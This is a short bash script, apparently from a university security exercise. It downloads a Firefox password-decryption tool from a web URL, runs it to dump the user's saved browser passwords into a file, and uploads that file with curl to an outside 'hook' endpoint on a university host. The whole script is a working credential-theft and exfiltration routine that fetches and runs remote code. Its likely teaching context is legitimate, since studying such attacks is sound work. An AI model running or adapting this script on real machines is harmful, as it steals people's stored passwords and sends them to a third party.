#!/bin/bash
cd Bureau/
curl -o firefox_decrypt.py https://ddealmei.github.io/assets/3b64d11ff0ac5da6a262b3490949ec7f6/firefox_decrypt.py
python3 firefox_decrypt.py > password.txt
curl -X POST --data-binary @password.txt --insecure https://ise2.istic.univ-rennes1.fr/hook/pprijent
